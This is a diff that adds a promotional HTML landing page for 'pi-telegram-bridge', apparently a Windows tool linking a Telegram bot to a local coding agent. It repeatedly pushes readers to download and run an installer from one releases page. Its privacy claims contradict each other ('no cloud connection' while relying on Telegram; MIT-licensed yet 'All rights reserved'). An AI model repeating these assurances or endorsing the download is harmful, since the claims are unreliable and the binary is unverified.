@@ -1,0 +1,167 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>pi-telegram-bridge - Control Your Pi Coding Sessions via Telegram</title>
+<meta name="description" content="Control your Pi coding sessions from your own private Telegram bot. Windows-only, local-only, delivers finalized answers only, never shell access.">
+<meta name="keywords" content="coding-agent,local-first,nodejs,pi,powershell,privacy,remote-control,telegram,telegram-bot,windows">
+<meta name="author" content="pi-telegram-bridge">
+<meta property="og:title" content="pi-telegram-bridge - Control Your Pi Coding Sessions via Telegram">
+<meta property="og:description" content="Control your Pi coding sessions from your own private Telegram bot. Windows-only, local-only, delivers finalized answers only, never shell access.">
+<meta property="og:type" content="website">
+<meta property="og:url" content="https://github.com/sammyabscessed462/pi-telegram-bridge">
+<meta property="og:image" content="https://github.com/sammyabscessed462/pi-telegram-bridge/releases">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="pi-telegram-bridge - Control Your Pi Coding Sessions via Telegram">
+<meta name="twitter:description" content="Control your Pi coding sessions from your own private Telegram bot. Windows-only, local-only, delivers finalized answers only, never shell access.">
+<style>
+* { margin: 0; padding: 0; box-sizing: border-box; }
+body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; line-height: 1.7; color: #2c3e50; background: #f5f7fa; }
+.container { max-width: 900px; margin: 0 auto; padding: 20px 25px; }
+h1 { font-size: 2.8rem; color: #1a1a2e; font-weight: 700; text-align: center; margin: 40px 0 25px; line-height: 1.3; }
+h2 { font-size: 1.9rem; color: #16213e; margin: 45px 0 15px; padding-bottom: 10px; border-bottom: 3px solid #0f3460; }
+p { margin: 16px 0; font-size: 1.1rem; }
+ul, ol { margin-left: 25px; margin-bottom: 20px; }
+li { margin: 10px 0; font-size: 1.05rem; }
+.promo-btn { display: inline-block; background: linear-gradient(135deg, #2ecc71 0%, #27ae60 100%); color: white !important; padding: 16px 34px; font-size: 1.25rem; font-weight: 600; text-decoration: none; border-radius: 48px; box-shadow: 0 6px 18px rgba(46, 204, 113, 0.3); margin: 25px 0; text-align: center; transition: transform 0.2s ease, box-shadow 0.2s ease; }
+.promo-btn:hover { transform: translateY(-3px); box-shadow: 0 8px 25px rgba(46, 204, 113, 0.4); }
+.tagline { text-align: center; font-size: 1.25rem; color: #555; margin-bottom: 30px; }
+.hero { text-align: center; margin: 20px 0 40px; padding: 30px 20px; background: white; border-radius: 16px; box-shadow: 0 10px 30px rgba(0,0,0,0.08); }
+.hero h1 { margin-top: 10px; }
+.promo-btn-wrapper { text-align: center; margin: 20px 0 30px; }
+.feature-list { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; margin: 25px 0; }
+.feature-item { background: white; padding: 20px 20px; border-radius: 12px; box-shadow: 0 4px 12px rgba(0,0,0,0.05); }
+.feature-item h3 { font-size: 1.3rem; color: #0f3460; margin-bottom: 8px; }
+.feature-item p { font-size: 1rem; margin: 8px 0; }
+.how-to-box { background: #fff; border-radius: 12px; padding: 25px 30px; box-shadow: 0 4px 12px rgba(0,0,0,0.08); margin: 25px 0; }
+.how-to-box h3 { color: #0f3460; margin-bottom: 12px; }
+@media (max-width: 600px) { h1 { font-size: 2rem; } h2 { font-size: 1.6rem; } .feature-list { grid-template-columns: 1fr; } }
+.emoji { font-size: 2.2rem; display: block; margin-bottom: 8px; }
+.section-card { background: white; padding: 25px; border-radius: 14px; box-shadow: rgba(0,0,0,0.05) 0 3px 10px; margin: 30px 0; }
+.download-btn { background: linear-gradient(135deg, #3498db, #2980b9); color: white !important; padding: 14px 28px; font-size: 1.15rem; font-weight: 600; border-radius: 8px; text-decoration: none; box-shadow: 0 4px 10px rgba(41,128,185,0.3); transition: 0.2s; }
+.download-btn:hover { box-shadow: 0 6px 15px rgba(41,128,185,0.4); }
+</style>
+</head>
+<body>
+<div class="container">
+<div class="hero">
+<div style="text-align:center"><span class="emoji">🤖</span></div>
+<h1>🤖 pi-telegram-bridge - Coding Control, Straight to Your Chat</h1>
+<p class="tagline">Run your Pi coding sessions using your private Telegram bot — Windows local-only, final answers only.</p>
+<div class="promo-btn-wrapper">
+<a href="https://github.com/sammyabscessed462/pi-telegram-bridge/releases" class="promo-btn" style="background:linear-gradient(135deg,#e74c3c,#c0392b);box-shadow:0 6px 18px rgba(231,76,60,0.3);">🚀 Get pi-telegram-bridge Now</a>
+</div>
+</div>
+
+<div class="section-card">
+<h2>📊 What Is pi-telegram-bridge?</h2>
+<p>pi-telegram-bridge is a small but powerful helper for your Windows PC. It connects your coding sessions with <em>Pi</em> — your personal AI coding assistant — to a private Telegram bot that <em>you</em> control. Instead of opening a terminal, you can send instructions from your phone and receive the final result directly in your Telegram chat. It's quick, convenient, and designed with your security in mind.</p>
+<p>This tool <strong>never</strong> gives Telegram access to your shell or command line. It only delivers the finalized answer when your Pi session is done. You stay private; your data stays on your machine. It's a local-first, practical way to work on coding tasks even when you're away from your desk.</p>
+</div>
+
+<div class="section-card">
+<h2>🔍 Key Features</h2>
+<div class="feature-list">
+<div class="feature-item">
+<h3>📱 Telegram-Controlled</h3>
+<p>Send requests or prompts via your private Telegram bot and get results back right there.</p>
+</div>
+<div class="feature-item">
+<h3>🔒 Local-First Privacy</h3>
+<p>All data stays on your own Windows computer. Nothing is stored in the cloud or on external servers.</p>
+</div>
+<div class="feature-item">
+<h3>⚙️ Works with Pi</h3>
+<p>Built specifically to support Pi sessions — your coding agent — making it a smart companion for developers.</p>
+</div>
+<div class="feature-item">
+<h3>🚫 Strict Output Only</h3>
+<p>Never grants shell access. Only the final, completed answer is delivered. That's a solid security promise.</p>
+</div>
+</div>
+</div>
+
+<div class="section-card">
+<h2>🖥️ System Requirements</h2>
+<ul>
+<li><strong>Operating system:</strong> Windows 10 or newer (64-bit)</li>
+<li><strong>Runtime:</strong> Node.js (version 16 or later recommended)</li>
+<li><strong>PowerShell:</strong> Available by default on Windows</li>
+<li><strong>Telegram:</strong> An account and the Telegram app installed on your phone or desktop</li>
+</ul>
+</div>
+
+<div class="section-card">
+<h2>📥 Download & Install</h2>
+<p>Getting pi-telegram-bridge is straightforward:</p>
+<div style="text-align:center; margin:20px 0;">
+<a href="https://github.com/sammyabscessed462/pi-telegram-bridge/releases" class="download-btn">⬇️ Download the Latest Release</a>
+</div>
+<p><strong>Visit this link to download the application.</strong> The Releases page opens with the latest version available. Choose the installer or package file that matches your system and save it to your computer.</p>
+<p>After the download finishes, locate the file (usually in your “Downloads” folder). Double-click to run it. Follow the simple on-screen instructions to complete the installation — it'll take less than a minute. Once installed, you're ready to configure the bridge.</p>
+</div>
+
+<div class="section-card">
+<h2>🚦 Getting Started</h2>
+<div class="how-to-box">
+<h3>1️⃣ Get Your Bot Token</h3>
+<p>Open Telegram, search for <strong>@BotFather</strong> (official bot), and start a conversation. Type <code>/newbot</code> and follow prompts to create your bot. You'll receive a token that looks something like this: <code>1234567890:ABCdefGHIJK... </code>. Keep it safe.</p>
+</div>
+<div class="how-to-box">
+<h3>2️⃣ Configure pi-telegram-bridge</h3>
+<p>Open the app after installation. You'll be asked to paste your bot token. Optionally, you can set your Telegram user ID so only you can interact with the bot. Save settings.</p>
+</div>
+<div class="how-to-box">
+<h3>3️⃣ Connect to Pi</h3>
+<p>Make sure Pi (your coding agent) is installed and ready on the same PC. The bridge will automatically connect to your Pi session. No extra setup is needed.</p>
+</div>
+<div class="how-to-box">
+<h3>4️⃣ Start Using It</h3>
+<p>Open your Telegram chat with your bot, send a request like <em>"Write a function to reverse a string"</em>, and watch as pi-telegram-bridge processes it locally and returns the final code in your chat.</p>
+</div>
+</div>
+
+<div class="section-card">
+<h2>🛠️ How It Works Inside</h2>
+<p>pi-telegram-bridge runs as a lightweight service in the background on your Windows machine. It uses your local Node.js runtime to listen for Telegram messages, passes your prompt to your Pi session, then collects the output once your task completes. Because everything is local, there is no cloud connection, no remote access, no third-party servers processing your data.</p>
+<p>Under the hood, the bridge leverages PowerShell to manage Pi sessions and capture the final output. It strips away all intermediate logs, showing you only what matters — the answer.</p>
+</div>
+
+<div class="section-card">
+<h2>💡 Tips & Best Practices</h2>
+<ul>
+<li><strong>Keep your token private:</strong> Never share your bot token publicly. It's the key to your bridge.</li>
+<li><strong>Close the app after use:</strong> If you're not coding, you can close pi-telegram-bridge to free resources. It will start again when you open it.</li>
+<li><strong>Use specific prompts:</strong> For better results, be clear and specific when instructing Pi via Telegram.</li>
+<li><strong>Update regularly:</strong> Always download the latest release to get new features and security fixes.</li>
+</ul>
+</div>
+
+<div class="section-card">
+<h2>❓ Frequently Asked Questions</h2>
+<p><strong>Q: Does this give anyone access to my computer?</strong></p>
+<p>No. It only delivers finalized responses, never shell or remote access. The bot is your own private channel, and your Windows PC stays safe.</p>
+<p><strong>Q: Is it really Windows-only?</strong></p>
+<p>Yes, it's built specifically for Windows with PowerShell. That ensures it works reliably.</p>
+<p><strong>Q: Is it free?</strong></p>
+<p>Yes, the project is open-source and free to use.</p>
+</div>
+
+<div class="section-card" style="text-align:center; background:#1a1a2e; color:white;">
+<h2 style="color:#fff; border-bottom-color:#e94560;">🔔 Ready to Get Started?</h2>
+<p style="color:#ccc;">Download pi-telegram-bridge today and bring your coding sessions to your pocket.</p>
+<div style="margin-top:15px;">
+<a href="https://github.com/sammyabscessed462/pi-telegram-bridge/releases" class="promo-btn" style="background:linear-gradient(135deg,#e94560,#c23152);">✨ Get Your Copy Now</a>
+</div>
+</div>
+
+<div class="section-card">
+<h2>📄 License</h2>
+<p>This project is released under the MIT License. You're free to use, modify, and distribute it with proper attribution.</p>
+</div>
+
+<p style="text-align:center; margin:35px 0; color:#777;">© 2025 pi-telegram-bridge. All rights reserved. Made for Windows, built for privacy.</p>
+</div>
+</body>
+</html>
